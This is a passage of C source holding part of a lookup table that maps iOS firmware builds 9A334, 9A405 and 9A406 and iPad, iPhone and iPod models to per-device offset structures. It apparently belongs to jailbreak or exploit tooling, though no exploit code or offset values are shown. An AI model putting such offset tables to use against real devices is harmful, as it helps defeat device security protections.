        [iPad1_1] = &offsets_iPad1_1_9A334,
        [iPhone2_1] = &offsets_iPhone2_1_9A334,
        [iPhone3_1] = &offsets_iPhone3_1_9A334,
        [iPhone4_1] = &offsets_iPhone4_1_9A334,
    },

    [FW9A405] = {
        [iPad1_1] = &offsets_iPad1_1,
	[iPhone2_1] = &offsets_iPhone2_1,
        [iPhone3_1] = &offsets_iPhone3_1,
        [iPhone3_3] = &offsets_iPhone3_3,
        [iPhone4_1] = &offsets_iPhone4_1,
        [iPad2_1] = &offsets_iPad2_1,
        [iPad2_2] = &offsets_iPad2_2,
        [iPad2_3] = &offsets_iPad2_3,
	[iPod3_1] = &offsets_iPod3_1,
	[iPod4_1] = &offsets_iPod4_1,
    },

    [FW9A406] = {
        [iPhone4_1] = &offsets_iPhone4_1_9A406,
    },
};

